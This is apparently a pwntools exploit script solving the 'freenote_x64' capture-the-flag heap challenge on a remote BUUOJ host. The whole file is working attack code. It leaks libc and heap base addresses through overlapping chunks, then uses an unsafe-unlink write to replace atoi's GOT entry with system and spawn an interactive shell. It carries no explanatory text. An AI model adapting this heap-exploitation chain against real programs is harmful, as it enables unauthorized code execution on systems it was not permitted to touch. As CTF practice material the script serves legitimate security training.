from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('freenote_x64')
io = remote('node4.buuoj.cn', 26384)
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
libc = ELF('libc-2.23.so')
elf = ELF('freenote_x64')
atoi_got = elf.got['atoi']

def show():
    io.sendlineafter('Your choice: ', '1')


def add(size, note):
    io.sendlineafter('Your choice: ', '2')
    io.sendlineafter('Length of new note: ', str(size))
    io.sendafter('Enter your note: ', note)


def edit(index, size, note):
    io.sendlineafter('Your choice: ', '3')
    io.sendlineafter('Note number: ', str(index))
    io.sendlineafter('Length of note: ', str(size))
    io.sendafter('Enter your note: ', note)


def delete(index):
    io.sendlineafter('Your choice: ', '4')
    io.sendlineafter('Note number: ', str(index))


def leak():
    global heap_base, libc_base
    add(0x80, 'a' * 0x80)
    add(0x80, 'b' * 0x80)
    add(0x80, 'c' * 0x80)
    add(0x80, 'd' * 0x80)
    add(0x80, 'e' * 0x80)
    delete(0)
    delete(1)
    add(0x90, b'a' * 0x88 + p64(0x91))
    delete(1)
    delete(3)
    edit(0, 0x90, b'a' * 0x90)
    show()
    io.recvuntil('a' * 0x90)
    libc_base = u64(io.recvline()[:-1].ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x68
    log.success('libc_base: ' + hex(libc_base))
    edit(0, 0x98, b'a' * 0x98)
    show()
    io.recvuntil('a' * 0x98)
    heap_base = u64(io.recvline()[:-1].ljust(8, b'\x00')) - 0x19d0
    log.success('heap_base: ' + hex(heap_base))
    edit(0, 0x98, b'a' * 0x88 + p64(0x91) + p64(libc_base + libc.sym['__malloc_hook'] + 0x68))
    
    
def unlink():
    add(0x80, 'b' * 0x80)
    chunk1_ptr = heap_base + 0x30
    fd, bk = chunk1_ptr - 0x18, chunk1_ptr - 0x10
    payload = p64(0) + p64(0x81) + p64(fd) + p64(bk) + b'a' * 0x60 + p64(0x80) + p64(0x90)
    edit(0, len(payload), payload)
    delete(1)
    payload = p64(2) + p64(1) + p64(8) + p64(atoi_got) + b'a' * 0x70
    edit(0, len(payload), payload)
    system = libc_base + libc.sym['system']
    edit(0, 8, p64(system))
    io.sendlineafter('Your choice: ', '/bin/sh\x00')
    # gdb.attach(io)
    # pause()
    io.interactive()


if __name__ == '__main__':
    leak()
    unlink()
